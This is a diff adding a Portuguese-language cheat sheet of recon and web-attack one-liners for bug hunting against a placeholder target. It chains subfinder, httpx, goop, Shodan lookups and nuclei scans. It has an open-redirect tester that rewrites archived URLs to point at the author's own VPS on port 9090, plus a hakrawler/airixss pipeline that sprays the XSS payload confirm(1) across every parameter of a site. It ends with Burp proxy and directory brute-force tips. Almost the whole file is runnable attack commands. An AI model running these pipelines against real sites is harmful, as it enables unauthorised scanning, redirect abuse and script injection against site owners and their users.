@@ -1,0 +1,58 @@
+Enumeração simples 
+
+*subfinder extrai os subdominios, o httpx vai testar as paginas e jogar o resultado para o anew sem duplicados
+#echo alvo.com | subfinder -silent | httpx -silent | anew 200http
+
+*extração completa de codigos e scripts, baixado localmente para analise
+#echo alvo.com | subfinder -silent | xargs -I@ sh -c 'goop @ -f' 
+
+
+Oneliner de open redirect
+*onde esta site teste pode ser meu ip/vps ou ngrok, lembrando que no 'http://siteteste.com' se for usar via 
+(python3 -m http.server 9090 na vps, tem que inserir a porta)
+#waybackurls alvo.com.br | grep -a -i \=http | qsreplace 'http://XXX.67.33.XXX:9090' | 
+while read host do;do curl -s -L $host -I|grep "http://XXX.67.33.XXX:9090" && echo -e "$host \033[0;31mVulnerable\n" ;done
+
+Automacao do nuclei****
+
+SdLookUp - (busca portas abertas no shodan e trás cve's)
+#echo hackerone.com | subfinder -silent | httpx -silent -ip | awk '{print $2}' | tr -d '[]' | xargs -I@ sh -c 'echo @ | sdlookup -json | python3 -m json.tool'
+
+
+Hakrawler XSS - (ira injetar o payload do xss em todo o site buscando os parametros vulneraveis)
+#echo testphp.vulnweb.com | httpx -silent | hakrawler -subs | grep "=" | qsreplace '"' | airixss -payload "confirm(1)" | egrep -v 'Not'
+
+
+Waymore - busca utilizando wayback machine 
+#python3 waymore.py -i sitealvo.com -f -mode U
+
+
+Tips Dork shodan 
+*buscar as ultimas CVEs lançadas dentro https://github.com/projectdiscovery/nuclei-templates/tree/master/cves/2022
+*buscar dentro do codigo da CVE uma dork chamada shodan-query: http.favicon.hash:780351152
+*configurar API do shodan (shodan init <api key>)
+ #cd shoscan-cli
+  #./run.sh
+   *entrar com a search query depois salva com o nome da vuln
+   *depois abrir o resulta gunzip NomeVuln.json.gz e começar a tratar com outras tools
+
+#cat NomeVuln.json | jq '.hostnames[]' | awk -F '"' '{print $2}' | httpx -silent   (vai filtrar hosts ativos extraidos da dork)
+#cat NomeVuln.json | jq '.hostnames[]' | awk -F '"' '{print $2}' | httpx -silent | nuclei -tags disclosure -severity high -silent (vai pegar pela tag da vuln "que esta no codigo" disclosure  e a severidade)
+
+
+Hacking swagger-UI - XSS
+
+
+-------------------------------------------------------------
+JOGAR SUBDOMINIOS PARA SCAN DO BURP PRO 
+
+*Deixar a vm em bridge, mudar no burp > proxy > options > proxy listeners edit e setar o ip real da maquina
+*Criar o arquivo dos subdominios, instalar o go e httpx
+#cat subdomainsALVO| httpx -silent -proxy http://192.168.15.187:8080
+
+
+BURP - BRUTE FORCE DIRETORIOS 
+*interceptar a pagina, ir em target site map, botao direito > engagement tools > Discovery content
+
+
+
